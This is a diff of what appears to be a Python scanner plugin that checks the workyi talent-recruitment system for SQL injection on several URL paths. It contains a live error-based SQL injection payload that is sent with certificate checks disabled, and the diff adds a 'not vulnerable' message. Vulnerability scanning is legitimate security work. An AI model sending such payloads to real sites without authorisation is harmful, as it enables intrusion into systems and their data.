@@ -30,14 +30,18 @@ class workyi_multi_sqli_BaseVerify:
                 "/companydh/parttime.aspx?key="]
         payload = "%27AnD%20@@VeRsIon>0%20Or%27%%27=%27%"
         try:
+            noexist = True
             for turl in urls:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.status_code == 500 and r"Microsoft SQL Server" in req.text:
                     cprint("[+]存在workyi人才系统多处注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在workyi_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
